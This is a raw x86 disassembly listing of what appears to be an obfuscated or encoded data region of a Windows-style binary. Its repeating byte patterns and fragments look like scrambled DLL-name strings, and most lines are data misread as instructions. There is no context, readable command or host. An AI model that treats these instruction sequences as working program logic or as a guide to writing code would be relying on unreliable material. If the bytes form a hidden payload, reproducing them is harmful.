  40302b:	69 eb 35 00 00 00    	imul   $0x35,%ebx,%ebp
	...
  403055:	00 00                	add    %al,(%eax)
  403057:	00 2a                	add    %ch,(%edx)
  403059:	69 fe 35 37 69 0e    	imul   $0xe693735,%esi,%edi
  40305f:	36 4a                	ss dec %edx
  403061:	69 1d 36 69 69 34 36 	imul   $0x3f695436,0x34696936,%ebx
  403068:	54 69 3f 
  40306b:	36 83 69 49 36       	subl   $0x36,%ss:0x49(%ecx)
  403070:	70 69                	jo     0x4030db
  403072:	54                   	push   %esp
  403073:	36 5c                	ss pop %esp
  403075:	69 68 36 63 69 72 36 	imul   $0x36726963,0x36(%eax),%ebp
  40307c:	b9 69 9a 36 f8       	mov    $0xf8369a69,%ecx
  403081:	69 cc 36 ec 69 dc    	imul   $0xdc69ec36,%esp,%ecx
  403087:	36 38 6a 2b          	cmp    %ch,%ss:0x2b(%edx)
  40308b:	37                   	aaa
  40308c:	06                   	push   %es
  40308d:	6a 4c                	push   $0x4c
  40308f:	37                   	aaa
  403090:	68 6a 63 37 27       	push   $0x2737636a
  403095:	6a 71                	push   $0x71
  403097:	37                   	aaa
  403098:	37                   	aaa
  403099:	6a 84                	push   $0xffffff84
  40309b:	37                   	aaa
  40309c:	ba 6a 9d 37 dc       	mov    $0xdc379d6a,%edx
  4030a1:	6a b1                	push   $0xffffffb1
  4030a3:	37                   	aaa
  4030a4:	83 6a ce 37          	subl   $0x37,-0x32(%edx)
  4030a8:	68 6a e5 37 3e       	push   $0x3e37e56a
  4030ad:	5b                   	pop    %ebx
  4030ae:	00 00                	add    %al,(%eax)
  4030b0:	3e 5b                	ds pop %ebx
  4030b2:	00 00                	add    %al,(%eax)
  4030b4:	3e 5b                	ds pop %ebx
  4030b6:	00 00                	add    %al,(%eax)
  4030b8:	3e 5b                	ds pop %ebx
	...
  4030e6:	3e 5b                	ds pop %ebx
  4030e8:	00 00                	add    %al,(%eax)
  4030ea:	3e 5b                	ds pop %ebx
  4030ec:	00 00                	add    %al,(%eax)
  4030ee:	3e 5b                	ds pop %ebx
  4030f0:	00 00                	add    %al,(%eax)
  4030f2:	3e 5b                	ds pop %ebx
  4030f4:	00 00                	add    %al,(%eax)
  4030f6:	3e 5b                	ds pop %ebx
  4030f8:	00 00                	add    %al,(%eax)
  4030fa:	3e 5b                	ds pop %ebx
  4030fc:	00 00                	add    %al,(%eax)
  4030fe:	3e 5b                	ds pop %ebx
  403100:	00 00                	add    %al,(%eax)
  403102:	3e 5b                	ds pop %ebx
  403104:	00 00                	add    %al,(%eax)
  403106:	3e 5b                	ds pop %ebx
  403108:	00 00                	add    %al,(%eax)
  40310a:	3e 5b                	ds pop %ebx
  40310c:	00 00                	add    %al,(%eax)
  40310e:	3e 5b                	ds pop %ebx
  403110:	00 00                	add    %al,(%eax)
  403112:	3e 5b                	ds pop %ebx
  403114:	00 00                	add    %al,(%eax)
  403116:	3e 5b                	ds pop %ebx
  403118:	00 00                	add    %al,(%eax)
  40311a:	3e 5b                	ds pop %ebx
  40311c:	00 00                	add    %al,(%eax)
  40311e:	3e 5b                	ds pop %ebx
  403120:	00 00                	add    %al,(%eax)
  403122:	3e 5b                	ds pop %ebx
  403124:	00 00                	add    %al,(%eax)
  403126:	3e 5b                	ds pop %ebx
  403128:	00 00                	add    %al,(%eax)
  40312a:	3e 5b                	ds pop %ebx
  40312c:	00 00                	add    %al,(%eax)
  40312e:	3e 5b                	ds pop %ebx
  403130:	00 00                	add    %al,(%eax)
  403132:	3e 5b                	ds pop %ebx
  403134:	00 00                	add    %al,(%eax)
  403136:	3e 5b                	ds pop %ebx
  403138:	00 00                	add    %al,(%eax)
  40313a:	3e 5b                	ds pop %ebx
  40313c:	00 00                	add    %al,(%eax)
  40313e:	3e 5b                	ds pop %ebx
  403140:	00 00                	add    %al,(%eax)
  403142:	3e 5b                	ds pop %ebx
  403144:	00 00                	add    %al,(%eax)
  403146:	3e 5b                	ds pop %ebx
	...
  403174:	3e 5b                	ds pop %ebx
  403176:	00 00                	add    %al,(%eax)
  403178:	3e 5b                	ds pop %ebx
  40317a:	00 00                	add    %al,(%eax)
  40317c:	3e 5b                	ds pop %ebx
  40317e:	00 00                	add    %al,(%eax)
  403180:	3e 5b                	ds pop %ebx
  403182:	00 00                	add    %al,(%eax)
  403184:	3e 5b                	ds pop %ebx
  403186:	00 00                	add    %al,(%eax)
  403188:	3e 5b                	ds pop %ebx
  40318a:	00 00                	add    %al,(%eax)
  40318c:	3e 5b                	ds pop %ebx
  40318e:	00 00                	add    %al,(%eax)
  403190:	3e 5b                	ds pop %ebx
  403192:	00 00                	add    %al,(%eax)
  403194:	3e 5b                	ds pop %ebx
  403196:	00 00                	add    %al,(%eax)
  403198:	3e 5b                	ds pop %ebx
  40319a:	00 00                	add    %al,(%eax)
  40319c:	3e 5b                	ds pop %ebx
  40319e:	00 00                	add    %al,(%eax)
  4031a0:	3e 5b                	ds pop %ebx
  4031a2:	00 00                	add    %al,(%eax)
  4031a4:	3e 5b                	ds pop %ebx
  4031a6:	00 00                	add    %al,(%eax)
  4031a8:	3e 5b                	ds pop %ebx
  4031aa:	00 00                	add    %al,(%eax)
  4031ac:	3e 5b                	ds pop %ebx
  4031ae:	00 00                	add    %al,(%eax)
  4031b0:	3e 5b                	ds pop %ebx
  4031b2:	00 00                	add    %al,(%eax)
  4031b4:	3e 5b                	ds pop %ebx
  4031b6:	00 00                	add    %al,(%eax)
  4031b8:	3e 5b                	ds pop %ebx
  4031ba:	00 00                	add    %al,(%eax)
  4031bc:	3e 5b                	ds pop %ebx
  4031be:	00 00                	add    %al,(%eax)
  4031c0:	3e 5b                	ds pop %ebx
  4031c2:	00 00                	add    %al,(%eax)
  4031c4:	3e 5b                	ds pop %ebx
  4031c6:	00 00                	add    %al,(%eax)
  4031c8:	3e 5b                	ds pop %ebx
  4031ca:	00 00                	add    %al,(%eax)
  4031cc:	3e 5b                	ds pop %ebx
  4031ce:	00 00                	add    %al,(%eax)
  4031d0:	3e 5b                	ds pop %ebx
  4031d2:	00 00                	add    %al,(%eax)
  4031d4:	3e 5b                	ds pop %ebx
	...
  403202:	3e 5b                	ds pop %ebx
  403204:	00 00                	add    %al,(%eax)
  403206:	3e 5b                	ds pop %ebx
  403208:	00 00                	add    %al,(%eax)
  40320a:	3e 5b                	ds pop %ebx
  40320c:	00 00                	add    %al,(%eax)
  40320e:	00 77 01             	add    %dh,0x1(%edi)
  403211:	00 3e                	add    %bh,(%esi)
  403213:	22 41 00             	and    0x0(%ecx),%al
  403216:	01 3e                	add    %edi,(%esi)
  403218:	74 50                	je     0x40326a
  40321a:	2c 34                	sub    $0x34,%al
  40321c:	63 41 22             	arpl   %ax,0x22(%ecx)
  40321f:	3f                   	aas
  403220:	72 65                	jb     0x403287
  403222:	2d 28 00 00 0a       	sub    $0xa000028,%eax
  403227:	34 61                	xor    $0x61,%al
  403229:	64 02 32             	add    %fs:(%edx),%dh
  40322c:	62 72 1f             	bound  %esi,0x1f(%edx)
  40322f:	29 79 45             	sub    %edi,0x45(%ecx)
  403232:	06                   	push   %es
  403233:	1a 00                	sbb    (%eax),%al
  403235:	00 0a                	add    %cl,(%edx)
  403237:	34 61                	xor    $0x61,%al
  403239:	64 02 32             	add    %fs:(%edx),%dh
  40323c:	62 72 df             	bound  %esi,-0x21(%edx)
  40323f:	28 79 45             	sub    %bh,0x45(%ecx)
  403242:	e6 0b                	out    %al,$0xb
  403244:	00 00                	add    %al,(%eax)
  403246:	01 3e                	add    %edi,(%esi)
  403248:	74 4d                	je     0x403297
  40324a:	e1 3e                	loope  0x40328a
  40324c:	75 6c                	jne    0x4032ba
  40324e:	e3 12                	jecxz  0x403262
  403250:	61                   	popa
  403251:	6e                   	outsb  %ds:(%esi),(%dx)
  403252:	da 36                	fidivl (%esi)
  403254:	65 41                	gs inc %ecx
  403256:	3e 5b                	ds pop %ebx
  403258:	00 00                	add    %al,(%eax)
  40325a:	7d 29                	jge    0x403285
  40325c:	65 61                	gs popa
  40325e:	b2 3e                	mov    $0x3e,%dl
  403260:	46                   	inc    %esi
  403261:	69 92 3e 41 00 aa 28 	imul   $0x9d727428,-0x55ffbec2(%edx),%edx
  403268:	74 72 9d 
  40326b:	3a 74 41 3e          	cmp    0x3e(%ecx,%eax,2),%dh
  40326f:	5b                   	pop    %ebx
  403270:	00 00                	add    %al,(%eax)
  403272:	79 3e                	jns    0x4032b2
  403274:	74 57                	je     0x4032cd
	...
  40329e:	00 00                	add    %al,(%eax)
  4032a0:	67 35 64 6f 69 28    	addr16 xor $0x28696f64,%eax
  4032a6:	44                   	inc    %esp
  4032a7:	69 6c 3e 63 74 51 29 	imul   $0x79295174,0x63(%esi,%edi,1),%ebp
  4032ae:	79 
  4032af:	41                   	inc    %ecx
  4032b0:	3e 5b                	ds pop %ebx
  4032b2:	00 00                	add    %al,(%eax)
  4032b4:	79 3e                	jns    0x4032f4
  4032b6:	74 4d                	je     0x403305
  4032b8:	59                   	pop    %ecx
  4032b9:	3f                   	aas
  4032ba:	75 6c                	jne    0x403328
  4032bc:	5b                   	pop    %ebx
  4032bd:	13 61 6e             	adc    0x6e(%ecx),%esp
  4032c0:	22 37                	and    (%edi),%dh
  4032c2:	65 57                	gs push %edi
  4032c4:	3e 5b                	ds pop %ebx
  4032c6:	00 00                	add    %al,(%eax)
  4032c8:	42                   	inc    %edx
  4032c9:	59                   	pop    %ecx
  4032ca:	40                   	inc    %eax
  4032cb:	00 4a 59             	add    %cl,0x59(%edx)
  4032ce:	40                   	inc    %eax
  4032cf:	00 62 59             	add    %ah,0x59(%edx)
  4032d2:	40                   	inc    %eax
  4032d3:	00 4a 59             	add    %cl,0x59(%edx)
  4032d6:	40                   	inc    %eax
  4032d7:	00 f6                	add    %dh,%dh
  4032d9:	58                   	pop    %eax
  4032da:	40                   	inc    %eax
  4032db:	00 ea                	add    %ch,%dl
  4032dd:	58                   	pop    %eax
  4032de:	40                   	inc    %eax
  4032df:	00 de                	add    %bl,%dh
  4032e1:	58                   	pop    %eax
  4032e2:	40                   	inc    %eax
  4032e3:	00 f6                	add    %dh,%dh
  4032e5:	58                   	pop    %eax
  4032e6:	40                   	inc    %eax
  4032e7:	00 01                	add    %al,(%ecx)
  4032e9:	3e 74 50             	je,pt  0x40333c
  4032ec:	ec                   	in     (%dx),%al
  4032ed:	33 63 41             	xor    0x41(%ebx),%esp
  4032f0:	e2 3e                	loop   0x403330
  4032f2:	72 65                	jb     0x403359
  4032f4:	cd 27                	int    $0x27
  4032f6:	00 00                	add    %al,(%eax)
  4032f8:	fa                   	cli
  4032f9:	33 61 64             	xor    0x64(%ecx),%esp
  4032fc:	f2 31 62 72          	repnz xor %esp,0x72(%edx)
  403300:	9f                   	lahf
  403301:	2d 79 45 00 00       	sub    $0x4579,%eax
	...
  40332e:	b6 1c                	mov    $0x1c,%dh
  403330:	00 00                	add    %al,(%eax)
  403332:	95                   	xchg   %eax,%ebp
  403333:	38 72 6e             	cmp    %dh,0x6e(%edx)
  403336:	9b                   	fwait
  403337:	2f                   	das
  403338:	33 32                	xor    (%edx),%esi
  40333a:	68 37 6c 6c 3e       	push   $0x3e6c6c37
  40333f:	5b                   	pop    %ebx
  403340:	00 00                	add    %al,(%eax)
  403342:	9b                   	fwait
  403343:	2e 76 63             	jbe,pn 0x4033a9
  403346:	8c 27                	mov    %fs,(%edi)
  403348:	2e 64 6a 2f          	cs fs push $0x2f
  40334c:	00 00                	add    %al,(%eax)
  40334e:	63 38                	arpl   %di,(%eax)
  403350:	6d                   	insl   (%dx),%es:(%edi)
  403351:	73 63                	jae    0x4033b6
  403353:	27                   	daa
  403354:	00 00                	add    %al,(%eax)
  403356:	53                   	push   %ebx
  403357:	2e 76 63             	jbe,pn 0x4033bd
  40335a:	4c                   	dec    %esp
  40335b:	27                   	daa
  40335c:	2e 64 62 2f          	cs bound %ebp,%fs:(%edi)
  403360:	00 00                	add    %al,(%eax)
  403362:	5b                   	pop    %ebx
  403363:	38 6d 63             	cmp    %ch,0x63(%ebp)
  403366:	4e                   	dec    %esi
  403367:	24 00                	and    $0x0,%al
  403369:	00 10                	add    %dl,(%eax)
  40336b:	34 72                	xor    $0x72,%al
  40336d:	74 2b                	je     0x40339a
  40336f:	3c 6c                	cmp    $0x6c,%al
  403371:	41                   	inc    %ecx
  403372:	1a 2f                	sbb    (%edi),%ch
  403374:	6f                   	outsl  %ds:(%esi),(%dx)
  403375:	63 3e                	arpl   %di,(%esi)
  403377:	5b                   	pop    %ebx
  403378:	00 00                	add    %al,(%eax)
  40337a:	f0 33 72 74          	lock xor 0x74(%edx),%esi
  40337e:	0b 3c 6c             	or     (%esp,%ebp,2),%edi
  403381:	41                   	inc    %ecx
  403382:	1a 2f                	sbb    (%edi),%ch
  403384:	6f                   	outsl  %ds:(%esi),(%dx)
  403385:	63 3e                	arpl   %di,(%esi)
  403387:	5b                   	pop    %ebx
  403388:	00 00                	add    %al,(%eax)
  40338a:	13 31                	adc    (%ecx),%esi
  40338c:	6d                   	insl   (%dx),%es:(%edi)
  40338d:	61                   	popa
  40338e:	ee                   	out    %al,(%dx)
  40338f:	08 69 65             	or     %ch,0x65(%ecx)
	...
  4033ba:	00 00                	add    %al,(%eax)
  4033bc:	f1                   	int1
  4033bd:	11 66 46             	adc    %esp,0x46(%esi)
  4033c0:	d7                   	xlat   %ds:(%ebx)
  4033c1:	2e 65 00 f0          	cs gs add %dh,%al
  4033c5:	33 72 74             	xor    0x74(%edx),%esi
  4033c8:	cb                   	lret
  4033c9:	3b 6c 50 cc          	cmp    -0x34(%eax,%edx,2),%ebp
  4033cd:	31 74 65 dd          	xor    %esi,-0x23(%ebp,%eiz,2)
  4033d1:	26 00 00             	add    %al,%es:(%eax)
  4033d4:	86 38                	xchg   %bh,(%eax)
  4033d6:	61                   	popa
  4033d7:	70 7f                	jo     0x403458
  4033d9:	2f                   	das
  4033da:	6c                   	insb   (%dx),%es:(%edi)
  4033db:	6f                   	outsl  %ds:(%esi),(%dx)
  4033dc:	9d                   	popf
  4033dd:	5b                   	pop    %ebx
  4033de:	00 00                	add    %al,(%eax)
  4033e0:	95                   	xchg   %eax,%ebp
  4033e1:	38 72 6e             	cmp    %dh,0x6e(%edx)
  4033e4:	a3 2f 33 32 60       	mov    %eax,0x6032332f
  4033e9:	37                   	aaa
  4033ea:	6c                   	insb   (%dx),%es:(%edi)
  4033eb:	6c                   	insb   (%dx),%es:(%edi)
  4033ec:	3e 5b                	ds pop %ebx
  4033ee:	00 00                	add    %al,(%eax)
  4033f0:	79 38                	jns    0x40342a
  4033f2:	74 50                	je     0x403444
  4033f4:	6c                   	insb   (%dx),%es:(%edi)
  4033f5:	32 63 65             	xor    0x65(%ebx),%ah
  4033f8:	6d                   	insl   (%dx),%es:(%edi)
  4033f9:	2e 48                	cs dec %eax
  4033fb:	65 5f                	gs pop %edi
  4033fd:	2b 00                	sub    (%eax),%eax
  4033ff:	00 3e                	add    %bh,(%esi)
  403401:	5b                   	pop    %ebx
  403402:	66 01 3e             	add    %di,(%esi)
  403405:	f7 59 90             	negl   -0x70(%ecx)
  403408:	3e b5 03             	ds mov $0x3,%ch
  40340b:	00 3e                	add    %bh,(%esi)
  40340d:	b0 03                	mov    $0x3,%al
  40340f:	00 3e                	add    %bh,(%esi)
  403411:	a1 fb 00 3e 6c       	mov    0x6c3e00fb,%eax
  403416:	03 00                	add    (%eax),%eax
  403418:	3e b4 03             	ds mov $0x3,%ah
  40341b:	00 3e                	add    %bh,(%esi)
  40341d:	74 04                	je     0x403423
	...
  403447:	00 00                	add    %al,(%eax)
  403449:	00 3e                	add    %bh,(%esi)
  40344b:	b4 03                	mov    $0x3,%ah
  40344d:	00 3e                	add    %bh,(%esi)
  40344f:	b4 03                	mov    $0x3,%ah
  403451:	00 3e                	add    %bh,(%esi)
  403453:	b4 03                	mov    $0x3,%ah
  403455:	00 3e                	add    %bh,(%esi)
  403457:	b4 03                	mov    $0x3,%ah
  403459:	00 3e                	add    %bh,(%esi)
  40345b:	b4 03                	mov    $0x3,%ah
  40345d:	00 3e                	add    %bh,(%esi)
  40345f:	b4 03                	mov    $0x3,%ah
  403461:	00 3e                	add    %bh,(%esi)
  403463:	b4 03                	mov    $0x3,%ah
  403465:	00 3e                	add    %bh,(%esi)
  403467:	b4 03                	mov    $0x3,%ah
  403469:	00 3e                	add    %bh,(%esi)
  40346b:	34 04                	xor    $0x4,%al
  40346d:	00 3e                	add    %bh,(%esi)
  40346f:	ba 1a ba 40 b4       	mov    $0xb440ba1a,%edx
  403474:	af                   	scas   %es:(%edi),%eax
  403475:	09 7b 92             	or     %edi,-0x6e(%ebx)
  403478:	bb 01 f2 ee 25       	mov    $0x25eef201,%ebx
  40347d:	54                   	push   %esp
  40347e:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40347f:	5b                   	pop    %ebx
  403480:	77 20                	ja     0x4034a2
  403482:	ae                   	scas   %es:(%edi),%al
  403483:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  403484:	6a 67                	push   $0x67
  403486:	ac                   	lods   %ds:(%esi),%al
  403487:	93                   	xchg   %eax,%ebx
  403488:	68 20 9d 93 69       	push   $0x69939d20
  40348d:	6e                   	outsb  %ds:(%esi),(%dx)
  40348e:	a9 7e 23 62 9b       	test   $0x9b62237e,%eax
  403493:	52                   	push   %edx
  403494:	76 75                	jbe    0x40350b
  403496:	98                   	cwtl
  403497:	52                   	push   %edx
  403498:	6d                   	insl   (%dx),%es:(%edi)
  403499:	6e                   	outsb  %ds:(%esi),(%dx)
  40349a:	5e                   	pop    %esi
  40349b:	f6 4a 53 1e          	testb  $0x1e,0x53(%edx)
  40349f:	97                   	xchg   %eax,%edi
  4034a0:	6a 64                	push   $0x64
  4034a2:	5b                   	pop    %ebx
  4034a3:	a0 08 0d 34 5b       	mov    0x5b340d08,%al
  4034a8:	cd 03                	int    $0x3
  4034aa:	3e 5b                	ds pop %ebx
  4034ac:	e9 03 00 00 00       	jmp    0x4034b4
	...
  4034d5:	00 00                	add    %al,(%eax)
  4034d7:	00 3e                	add    %bh,(%esi)
  4034d9:	5b                   	pop    %ebx
  4034da:	b9 40 3e 5b 9d       	mov    $0x9d5b3e40,%ecx
  4034df:	04 3d                	add    $0x3d,%al
  4034e1:	5b                   	pop    %ebx
  4034e2:	e0 07                	loopne 0x4034eb
  4034e4:	c1 10 e9             	rcll   $0xe9,(%eax)
  4034e7:	03 3e                	add    (%esi),%edi
  4034e9:	5b                   	pop    %ebx
  4034ea:	e9 03 3e 5b 09       	jmp    0x99b72f2
  4034ef:	04 39                	add    $0x39,%al
  4034f1:	5a                   	pop    %edx
  4034f2:	f2 04 3c             	repnz add $0x3c,%al
  4034f5:	6d                   	insl   (%dx),%es:(%edi)
  4034f6:	e9 1b 3f 5b e9       	jmp    0xe99b7416
  4034fb:	55                   	push   %ebp
  4034fc:	3e 5b                	ds pop %ebx
  4034fe:	e9 03 3e 5b 10       	jmp    0x109b7306
  403503:	07                   	pop    %es
  403504:	3f                   	aas
  403505:	5b                   	pop    %ebx
  403506:	e9 13 3e 5b e9       	jmp    0xe99b731e
  40350b:	33 3f                	xor    (%edi),%edi
  40350d:	5b                   	pop    %ebx
  40350e:	e9 03 fe 5a e9       	jmp    0xe99b3316
  403513:	13 3e                	adc    (%esi),%edi
  403515:	5b                   	pop    %ebx
  403516:	e9 05 3e 5b ed       	jmp    0xed9b7320
  40351b:	03 3e                	add    (%esi),%edi
  40351d:	5b                   	pop    %ebx
  40351e:	e9 03 3e 5b ed       	jmp    0xed9b7326
  403523:	03 3e                	add    (%esi),%edi
  403525:	5b                   	pop    %ebx
  403526:	e9 03 3e 5b e9       	jmp    0xe99b732e
  40352b:	93                   	xchg   %eax,%ebx
  40352c:	3f                   	aas
  40352d:	5b                   	pop    %ebx
  40352e:	e9 05 3e 5b 37       	jmp    0x379b7338
  403533:	35 3c 5b eb 03       	xor    $0x3eb5b3c,%eax
  403538:	3e 5b                	ds pop %ebx
  40353a:	e9 03 00 00 00       	jmp    0x403542
	...
  403563:	00 00                	add    %al,(%eax)
  403565:	00 2e                	add    %ch,(%esi)
  403567:	5b                   	pop    %ebx
  403568:	e9 13 3e 5b e9       	jmp    0xe99b7380
  40356d:	03 2e                	add    (%esi),%ebp
  40356f:	5b                   	pop    %ebx
  403570:	e9 13 3e 5b 00       	jmp    0x9b7388
  403575:	e9 3d 5b 00 d9       	jmp    0xd94090b7
  40357a:	3d 5b 00 e9 3d       	cmp    $0x3de9005b,%eax
  40357f:	5b                   	pop    %ebx
  403580:	00 e9                	add    %ch,%cl
  403582:	3d 5b 00 25 57       	cmp    $0x5725005b,%eax
  403587:	5a                   	pop    %edx
  403588:	00 21                	add    %ah,(%ecx)
  40358a:	3d 5b 00 e9 3d       	cmp    $0x3de9005b,%eax
  40358f:	5b                   	pop    %ebx
  403590:	00 e9                	add    %ch,%cl
  403592:	3d 5b 00 e9 3d       	cmp    $0x3de9005b,%eax
  403597:	5b                   	pop    %ebx
  403598:	00 e9                	add    %ch,%cl
  40359a:	3d 5b 00 e9 3d       	cmp    $0x3de9005b,%eax
  40359f:	5b                   	pop    %ebx
  4035a0:	00 e9                	add    %ch,%cl
  4035a2:	3d 5b 00 e9 3d       	cmp    $0x3de9005b,%eax
  4035a7:	5b                   	pop    %ebx
  4035a8:	00 e9                	add    %ch,%cl
  4035aa:	3d 5b 00 e9 3d       	cmp    $0x3de9005b,%eax
  4035af:	5b                   	pop    %ebx
  4035b0:	00 e9                	add    %ch,%cl
  4035b2:	3d 5b 00 e9 3d       	cmp    $0x3de9005b,%eax
  4035b7:	5b                   	pop    %ebx
  4035b8:	00 e9                	add    %ch,%cl
  4035ba:	3d 5b 00 e9 3d       	cmp    $0x3de9005b,%eax
  4035bf:	5b                   	pop    %ebx
  4035c0:	00 e9                	add    %ch,%cl
  4035c2:	3d 5b 00 e9 3d       	cmp    $0x3de9005b,%eax
  4035c7:	5b                   	pop    %ebx
  4035c8:	00 e9                	add    %ch,%cl
	...
  4035f2:	00 00                	add    %al,(%eax)
  4035f4:	3d 5b 00 e9 3d       	cmp    $0x3de9005b,%eax
  4035f9:	5b                   	pop    %ebx
  4035fa:	00 e9                	add    %ch,%cl
  4035fc:	3d 5b 00 e9 3d       	cmp    $0x3de9005b,%eax
  403601:	5b                   	pop    %ebx
  403602:	00 e9                	add    %ch,%cl
  403604:	3d 5b 00 0d bd       	cmp    $0xbd0d005b,%eax
  403609:	5c                   	pop    %esp
  40360a:	00 79 3d             	add    %bh,0x3d(%ecx)
  40360d:	5b                   	pop    %ebx
  40360e:	00 e9                	add    %ch,%cl
  403610:	3d 5b 00 e9 3d       	cmp    $0x3de9005b,%eax
  403615:	5b                   	pop    %ebx
  403616:	00 00                	add    %al,(%eax)
  403618:	17                   	pop    %ss
  403619:	5b                   	pop    %ebx
  40361a:	00 00                	add    %al,(%eax)
  40361c:	e7 5a                	out    %eax,$0x5a
  40361e:	00 00                	add    %al,(%eax)
  403620:	e7 5a                	out    %eax,$0x5a
  403622:	00 00                	add    %al,(%eax)
  403624:	d7                   	xlat   %ds:(%ebx)
  403625:	5a                   	pop    %edx
  403626:	00 00                	add    %al,(%eax)
  403628:	09 2f                	or     %ebp,(%edi)
  40362a:	65 78 b3             	gs js  0x4035e0
  40362d:	5a                   	pop    %edx
  40362e:	00 00                	add    %al,(%eax)
  403630:	9c                   	pushf
  403631:	4b                   	dec    %ebx
  403632:	01 00                	add    %eax,(%eax)
  403634:	d7                   	xlat   %ds:(%ebx)
  403635:	4a                   	dec    %edx
  403636:	00 00                	add    %al,(%eax)
  403638:	d7                   	xlat   %ds:(%ebx)
  403639:	42                   	inc    %edx
  40363a:	01 00                	add    %eax,(%eax)
  40363c:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40363d:	58                   	pop    %eax
  40363e:	00 00                	add    %al,(%eax)
  403640:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  403641:	5a                   	pop    %edx
  403642:	00 00                	add    %al,(%eax)
  403644:	97                   	xchg   %eax,%edi
  403645:	5a                   	pop    %edx
  403646:	00 00                	add    %al,(%eax)
  403648:	97                   	xchg   %eax,%edi
  403649:	5a                   	pop    %edx
  40364a:	00 00                	add    %al,(%eax)
  40364c:	47                   	inc    %edi
  40364d:	57                   	push   %edi
  40364e:	00 60 39             	add    %ah,0x39(%eax)
  403651:	25 64 61 f3 39       	and    $0x39f36164,%eax
	...
  403682:	97                   	xchg   %eax,%edi
  403683:	59                   	pop    %ecx
  403684:	00 00                	add    %al,(%eax)
  403686:	67 6a 01             	addr16 push $0x1
  403689:	00 67 58             	add    %ah,0x58(%edi)
  40368c:	00 00                	add    %al,(%eax)
  40368e:	57                   	push   %edi
  40368f:	40                   	inc    %eax
  403690:	01 00                	add    %eax,(%eax)
  403692:	57                   	push   %edi
  403693:	5a                   	pop    %edx
  403694:	00 00                	add    %al,(%eax)
  403696:	67 5a                	addr16 pop %edx
  403698:	00 00                	add    %al,(%eax)
  40369a:	67 5a                	addr16 pop %edx
  40369c:	00 00                	add    %al,(%eax)
  40369e:	17                   	pop    %ss
  40369f:	57                   	push   %edi
  4036a0:	00 40 69             	add    %al,0x69(%eax)
  4036a3:	fe                   	(bad)
  4036a4:	60                   	pusha
  4036a5:	74 46                	je     0x4036ed
  4036a7:	57                   	push   %edi
  4036a8:	00 00                	add    %al,(%eax)
  4036aa:	2f                   	das
  4036ab:	14 00                	adc    $0x0,%al
  4036ad:	00 17                	add    %dl,(%edi)
  4036af:	1a 01                	sbb    (%ecx),%al
  4036b1:	00 17                	add    %dl,(%edi)
  4036b3:	10 00                	adc    %al,(%eax)
  4036b5:	00 27                	add    %ah,(%edi)
  4036b7:	46                   	inc    %esi
  4036b8:	01 00                	add    %eax,(%eax)
  4036ba:	3e b4 03             	ds mov $0x3,%ah
  4036bd:	00 3e                	add    %bh,(%esi)
  4036bf:	b4 03                	mov    $0x3,%ah
  4036c1:	00 3e                	add    %bh,(%esi)
  4036c3:	b4 03                	mov    $0x3,%ah
  4036c5:	00 3e                	add    %bh,(%esi)
  4036c7:	f4                   	hlt
  4036c8:	03 00                	add    (%eax),%eax
  4036ca:	fe                   	(bad)
  4036cb:	b3 03                	mov    $0x3,%bl
  4036cd:	00 3e                	add    %bh,(%esi)
  4036cf:	b4 03                	mov    $0x3,%ah
  4036d1:	00 3e                	add    %bh,(%esi)
  4036d3:	b4 03                	mov    $0x3,%ah
  4036d5:	00 3e                	add    %bh,(%esi)
  4036d7:	b4 03                	mov    $0x3,%ah
  4036d9:	00 3e                	add    %bh,(%esi)
  4036db:	df 8c ec 6e ec 6b 0f 	fisttps 0xf6bec6e(%esp,%ebp,8)
  4036e2:	2e f4                	cs hlt
  4036e4:	03 f8                	add    %eax,%edi
	...
  40370e:	00 00                	add    %al,(%eax)
  403710:	2c b3                	sub    $0xb3,%al
  403712:	c4                   	(bad)
  403713:	ff b1 1e 0b 6a 3f    	push   0x3f6a0b1e(%ecx)
  403719:	da 03                	fiaddl (%ebx)
  40371b:	e8 25 80 04 00       	call   0x44b745
  403720:	87 f1                	xchg   %esi,%ecx
  403722:	00 00                	add    %al,(%eax)
  403724:	eb 38                	jmp    0x40375e
  403726:	e8 50 e6 1b 26       	call   0x265c1d7b
  40372b:	10 fe                	adc    %bh,%dh
  40372d:	b3 fb                	mov    $0xfb,%bl
  40372f:	72 3f                	jb     0x403770
  403731:	f1                   	int1
  403732:	f7 83 f3 bb 03 74 35 	testl  $0x8513935,0x7403bbf3(%ebx)
  403739:	39 51 08 
  40373c:	b5 a1                	mov    $0xa1,%ch
  40373e:	f6 75 46             	divb   0x46(%ebp)
  403741:	bd 52 08 87 f1       	mov    $0xf1870852,%ebp
  403746:	00 00                	add    %al,(%eax)
  403748:	f3 38 e8             	repz cmp %ch,%al
  40374b:	83 7a db 54          	cmpl   $0x54,-0x25(%edx)
  40374f:	58                   	pop    %eax
  403750:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  403751:	47                   	inc    %edi
  403752:	14 40                	adc    $0x40,%al
  403754:	3e 2a 72 01          	sub    %ds:0x1(%edx),%dh
  403758:	fd                   	std
  403759:	2d f7 75 32 5b       	sub    $0x5b3275f7,%eax
  40375e:	76 41                	jbe    0x4037a1
  403760:	16                   	push   %ss
  403761:	95                   	xchg   %eax,%ebp
  403762:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  403763:	f7 3e                	idivl  (%esi)
  403765:	5b                   	pop    %ebx
  403766:	e9 03 b5 06 e1       	jmp    0xe146ec6e
  40376b:	8a 2c 31             	mov    (%ecx,%esi,1),%ch
  40376e:	e9 f6 73 4b 3e       	jmp    0x3e8bab69
  403773:	71 00                	jno    0x403775
	...
  40379d:	00 f2                	add    %dh,%dl
  40379f:	9c                   	pushf
  4037a0:	bc fb e9 26 e1       	mov    $0xe126e9fb,%esp
  4037a5:	f6 8c 47 30 c2 4a 5b 	testb  $0xb4,0x5b4ac230(%edi,%eax,2)
  4037ac:	b4 
  4037ad:	8a e2                	mov    %dl,%ah
  4037af:	d8 2d fc 6e 03 81    	fsubrs 0x81036efc
  4037b5:	85 2e                	test   %ebp,(%esi)
  4037b7:	1b e9                	sbb    %ecx,%ebp
  4037b9:	fb                   	sti
  4037ba:	2c 5a                	sub    $0x5a,%al
  4037bc:	2a f7                	sub    %bh,%dh
  4037be:	79 16                	jns    0x4037d6
  4037c0:	f1                   	int1
  4037c1:	03 3e                	add    (%esi),%edi
  4037c3:	5b                   	pop    %ebx
  4037c4:	e9 be fb 9e e9       	jmp    0xe9df3387
  4037c9:	03 3e                	add    (%esi),%edi
  4037cb:	5b                   	pop    %ebx
